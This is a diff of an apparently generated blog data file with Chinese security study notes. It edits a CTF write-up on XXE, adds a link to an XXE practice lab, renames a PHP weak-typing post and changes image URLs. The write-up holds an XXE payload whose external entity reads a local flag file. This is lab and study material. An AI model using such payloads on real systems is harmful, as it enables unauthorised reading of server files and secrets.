@@ -6984,8 +6984,11 @@
                 <div class="image-caption">image.png</div>
             </figure>
 
-<p>思路：<br>告诉了 flag 的位置，并且是在非 apache 解析目录相下，想读取文件，要么 getshell 才行，要么文件读取<br>在发请求过程实现文件读取 -&gt; XXE</p>
+<p>思路：<br>告诉了 flag 的位置，并且是在非 apache 解析目录相下，想读取文件，要么 getshell，要么文件读取</p>
+<p>在发请求过程实现文件读取 -&gt; XXE</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">evil</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///home/ctf/flag.txt"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="xxe-lab"><a href="#xxe-lab" class="headerlink" title="xxe-lab"></a>xxe-lab</h1><p><a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a><br>直接放到 phpstudy 的 WWW 目录下</p>
 ]]></content>
   </entry>
   <entry>
@@ -11320,7 +11323,7 @@
 ]]></content>
   </entry>
   <entry>
-    <title>PHP代码审计</title>
+    <title>PHP一些特色</title>
     <url>/2019/11/10/oxci5k/</url>
     <content><![CDATA[<h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><p>字符串与数值做比较，会先把字符串转换成数值</p>
 <p>$a==$b  意思是，如果不同类型，经过类型转换后，$a与$b 相等</p>
@@ -11338,7 +11341,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565490748380-1fcee1ff-9d25-4406-8abf-7752542a49b5.png#align=left&display=inline&height=222&name=image.png&originHeight=289&originWidth=501&size=23167&status=done&style=none&width=384.7679882578129" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565490748380-1fcee1ff-9d25-4406-8abf-7752542a49b5.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=image.png&originHeight=289&originWidth=501&size=23167&status=done&style=none&width=384.7679882578129" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -11377,7 +11380,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528053120-f73633fd-e52c-4489-8ce6-d685093c6bbd.png#align=left&display=inline&height=184&name=image.png&originHeight=239&originWidth=792&size=34005&status=done&style=none&width=608.2559814375006" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528053120-f73633fd-e52c-4489-8ce6-d685093c6bbd.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&name=image.png&originHeight=239&originWidth=792&size=34005&status=done&style=none&width=608.2559814375006" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -11389,7 +11392,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528704288-0111f51e-bc1f-4bb8-86b4-f8d4c886defe.png#align=left&display=inline&height=280&name=image.png&originHeight=364&originWidth=1067&size=81924&status=done&style=none&width=819.4559749921883" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528704288-0111f51e-bc1f-4bb8-86b4-f8d4c886defe.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=364&originWidth=1067&size=81924&status=done&style=none&width=819.4559749921883" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -11401,7 +11404,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528805731-25799f6b-6782-44b7-9bdc-d4c59b770188.png#align=left&display=inline&height=289&name=image.png&originHeight=376&originWidth=1399&size=94884&status=done&style=none&width=1074.4319672109384" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565528805731-25799f6b-6782-44b7-9bdc-d4c59b770188.png#align=left&display=inline&height=289&margin=%5Bobject%20Object%5D&name=image.png&originHeight=376&originWidth=1399&size=94884&status=done&style=none&width=1074.4319672109384" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
